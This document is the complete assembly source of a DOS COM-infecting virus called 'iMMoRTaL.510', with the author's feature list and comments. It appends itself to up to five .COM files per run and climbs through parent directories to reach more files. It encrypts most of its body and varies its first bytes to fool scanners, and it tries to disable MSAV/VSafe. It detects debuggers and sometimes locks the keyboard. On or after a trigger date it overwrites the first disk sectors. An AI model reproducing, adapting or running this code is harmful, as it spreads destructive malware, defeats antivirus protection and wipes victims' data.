%OUT iMMoRTaL.510 virus by Immortal EAS.
%OUT Little encrypted parasatic non-tsr appending virus. Features:
%OUT  + Anti-tracing meganism
%OUT  + 13% chance on a keyboard lock
%OUT  + 50% chance on a little message
%OUT  + Quick spreading routine, 5 infects per run
%OUT  + Upwards traversal (DotDot technique!)
%OUT AV Fool techniques:
%OUT  + Little polymorph for first 2 byte
%OUT  + Big part is encrypted
%OUT  + VSafe takedown  (!!)
%OUT  + Simple but working version to get Delta Offset  ("E")
%OUT  + On 11-08+ (My birthday!) it will erase the first 25h sectors!

.model  tiny
.code
    
    ORG     100h                    ;COM file remember?!?

start:  push    ax                      ;Some junk to fool TBAV
    pop     cx
    
    mov     dx,05945h
    mov     ax,0fa01h               ;Let's take down MSAV!!!
    int     16h
    
    call    getdlt                  ;Nice way to get delta offset!
realst:
getdlt: pop     bp
    sub     bp, offset getdlt
    call    encdec                 ;Decrypt the virus
    jmp     codest

writec: mov     ah,2ch
        int     21h
        cmp     dl,01h
        je      mode0
        cmp     dl,05h
        je      mode1
        cmp     dl,10h
        je      mode2
        cmp     dl,15h
        je      mode2
        cmp     dl,20h
        je      mode3
        cmp     dl,25h
        je      mode4
        cmp     dl,30h
        je      mode5
        cmp     dl,35h
        je      mode6
        jmp     writec
mode0:  mov     byte ptr [offset start+bp],93h
        mov     byte ptr [offset start+1+bp],90h
        jmp     r_enc
mode1:  mov     byte ptr [offset start+bp],53h
        mov     byte ptr [offset start+1+bp],58h
        jmp     r_enc
mode2:  mov     byte ptr [offset start+bp],0EBh
        mov     byte ptr [offset start+1+bp],00h
        jmp     r_enc
mode3:  mov     byte ptr [offset start+bp],3Ch
        mov     ah,2ch
        int     21h
        mov     byte ptr [offset start+1+bp],dl
        jmp     r_enc
mode4:  mov     byte ptr [offset start+bp],9Ch
        mov     byte ptr [offset start+1+bp],9Dh
        jmp     r_enc
mode5:  mov     byte ptr [offset start+bp],56h
        mov     byte ptr [offset start+1+bp],5Eh
        jmp     r_enc
mode6:  mov     byte ptr [offset start+bp],57h
        mov     byte ptr [offset start+1+bp],1fh
        jmp     r_enc

r_enc:  int     21h
    cmp     dl,0
    je      r_enc
        mov     byte ptr [enccde+bp],dl
    call    encdec
    mov     ah,40h                  ;Implend our viral code into victim
    mov     cx,eov-start
    lea     dx,[bp+start]
    int     21h
    call    encdec
    ret

encdec: mov     cx,(offset eov-offset codest)
    lea     si,[offset codest+bp]
decryp: db      80h,34h
enccde: db      00h
    inc     si
    dec     cx
    jnz     decryp
    ret

codest: lea     si,[orgbts+bp]          ;Restore first 4 bytes        
    mov     di,0100h
    movsw
    movsw
    
    push    cs                      ;DS <==> CS
    pop     ds

    lea     dx,[eov+bp]             ;Set DTA address
    mov     ah,1ah
    int     21h
    
    mov     al,01h                  ;Detect INT 1 trace...
    mov     ah,35h
    int     21h
    push    es
    pop     ax
    cmp     ax,70h                  ;Default segment INT 1 & 3
    jne     lockkb
    
    mov     al,03h                  ;Detect INT 3 trace...
    mov     ah,35h
    int     21h
    push    es
    pop     ax
    cmp     ax,70h                  ;Default segment INT 1 & 3
    jne     lockkb
    
    mov     ah,2ch                  ;13% chance to lock keyboard!
    int     21h
    cmp     dl, 0dh
    jg      nolock

lockkb: mov     al,82h                  ;Actual keyboard lock!
        out 21h,al
    
nolock: mov     ah,2ch                  ;50% chance to print message!
    int     21h
    cmp     dl,32h
    jg      spread

wr_msg: mov     ah,09h                  ;Bingo! print message!
    lea     dx, [bp+offset welcome]
    int     21h
    mov     ah,00h                  ;Wait for a key!
    int     16h
    jmp     spread
            
welcome db 'iMMoRTaL.510 {Encrypted!!}',07h,07h,07h,0dh,0ah,'$'

spread: mov     byte ptr [infcnt+bp],0
spred:  mov     ah,4eh                  ;Findfirst
    lea     dx,[fspec+bp]           ;Filespec=*.COM
    
fnext:  cmp     byte ptr [infcnt+bp],5
    je      exit_v
    
    int     21h
    jc      DotDot                  ;No more files found? Go to '..'

    lea     dx,[eov+1eh+bp]         ;Open file
    mov     ax,3d02h
    int     21h

    jc      nextf                   ;Error opening file, next!

    xchg    bx,ax

    mov     cx,0004h                ;Read first 4 bytes for check
    mov     ah,3fh                  ; if already infected or misnamed!
    lea     dx,[orgbts+bp]
    int     21h

        cmp     word ptr [orgbts+bp],'ZM' ;Misnamed .EXE file
        jz      shutit
    cmp     byte ptr [orgbts+bp+3],'I' ;Already infected
    jz      shutit

    mov     ax,4202h                ;Goto eof
    sub     cx,cx                   ;2 byte version of mov cx,0!!
    cwd                             ;1 byte version of mov dx,0!!
    int     21h

    sub     ax,0003h                ;Use our jmp table
    mov     word ptr [bp+jmptbl+1],ax

    call    writec

    mov     ax,4200h                ;Goto SOF
    sub     cx,cx
    cwd
    int     21h

    mov     ah,40h                  ;Write first four bytes over
    mov     cx,0004h                ; the original
    lea     dx,[bp+jmptbl]
    int     21h
    add     byte ptr [infcnt+bp],1

shutit: mov     ah,3eh                  ;Close victim
    int     21h

nextf:  mov     ah,4fh                  ;Find next file
    jmp     fnext

dotdot: mov     ax,3b00h                ;Dot-Dot...
    lea     dx,[bp+offset Dot_Dot]
    int     21h
    jc      exit_v
    jmp     spred

exit_v: mov     ah,2ah                  ;If date is 11-08+ screw current drv.
    int     21h
    cmp     dh,11h
    jl      re_dta
    cmp     dl,08h
    jl      re_dta

    mov     ah,19h
    int     21h
    mov     cx,0025h
    mov     dx,0
    lea     bx,[offset welcome+bp]
    push    ds
    pop     es
int26h: int     26h                     ;Cloaked interrupt 26h
    add     sp,2

re_dta: mov     ah,1ah                  ;Reset DTA
    mov     dx,0080h
    int     21h

    mov     di,0100h                ;Return control to original file!
    push    di
    ret
eoc:                                    ;End Of Code...

fspec   db      '*.com',0
infcnt  db      0
dot_dot db      '..',0
jmptbl  db      0e9h,00h,00h,'I'
orgbts: db      90h,90h,90h,90h
eov:
end     start
